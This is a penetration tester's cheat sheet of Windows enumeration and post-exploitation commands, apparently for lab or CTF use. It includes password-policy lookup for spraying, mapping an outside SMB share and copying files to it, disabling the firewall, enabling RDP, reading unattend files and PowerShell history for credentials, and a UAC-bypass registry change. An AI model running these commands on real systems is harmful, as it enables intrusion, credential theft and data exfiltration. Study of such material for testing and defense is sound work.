# Windows Enumeration Tips

## Net Commands
[Windows Net Commands](./net-commands.md)
 
 ## Searching files with dir
 ```
 [@swisskyrepo] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
 dir /S /B filename*.txt
 ```

## Get Passrod Policy for Spraying
```
net accounts
```


 ## Map Drive from CLI
 ```
 net use f: \\10.10.14.49\files /user:ph0enix password123
 net use M: \\ip-address\share /Persistent:Yes
 ```

 ## Copy File to Mapped Drive
 ```
 cp <filename> f:\ 
 (or location)
 ```

 ## Enable/Disable Windows Firewall CLI
 ```
 NetSh Advfirewall set allprofiles state on
 NetSh advfirewall set allprofiles state off
 ```

 ## Enable RDP (Terminal Services)
 ```
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```

 ## Mount a VHD Drive
 - ```--add`` is the name of the file
 ```
 mkdir /mnt/vhd
 sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
 ```

 ## Extend Trial License
 ```
 slmgr.vbs -rearm
 ```

 ## Unattended Windows Installations
 ```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
 ```

## Checking PowerShell History
Powershell.exe does not recognize or use the %% reference, so need to use env variables

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (cmd.exe)
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (powershell.exe)
```

## Disable LocalAccountTokenFilterPolicy 
If you are in the Backup Operators group, if/when you login via WinRM you wont have any administrative privilges.  To fix this
We need to elevate privileges via UAC, which is not possible through CLI, so we need to disable the registry setting

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```